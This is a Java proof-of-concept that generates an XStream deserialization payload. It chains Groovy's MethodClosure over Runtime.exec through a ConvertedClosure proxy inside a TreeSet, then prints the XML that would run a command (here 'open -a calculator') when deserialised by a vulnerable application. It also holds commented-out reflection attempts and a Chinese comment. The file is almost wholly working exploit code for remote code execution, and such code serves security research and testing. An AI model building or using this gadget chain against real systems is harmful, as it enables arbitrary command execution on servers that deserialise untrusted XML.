import com.thoughtworks.xstream.XStream;
import groovy.lang.Closure;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Set;
import java.util.TreeSet;

public class MethodClosurePayload {

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException {
//
        Set<Object> set = new TreeSet<Object>();
        MethodClosure methodClosure = new MethodClosure(Runtime.getRuntime(), "exec");

        ConvertedClosure handler = new ConvertedClosure((Closure) methodClosure, "compareTo");
        Object map = Proxy.newProxyInstance(
                MethodClosurePayload.class.getClassLoader(),
                new Class<?>[]{Comparable.class}, handler);

        set.add("open -a calculator");
        set.add(map);
        // 需要手工实现add 难。。

//        Method m = set.getClass().getDeclaredMethod("add", Object.class);
//        m.invoke(set,"open -a calculator");
//        m.invoke(set, map);

//        Field f = set.getClass().getDeclaredField("m");
//        f.setAccessible(true);
//        f.set(set, "open -a calculator");
//
//        Field f2 = set.getClass().getDeclaredField("n");
//        f2.setAccessible(true);
//        f2.set(set, map);

        XStream xs = new XStream();
        String xml = xs.toXML(set);
        System.out.println(xml);
    }
}
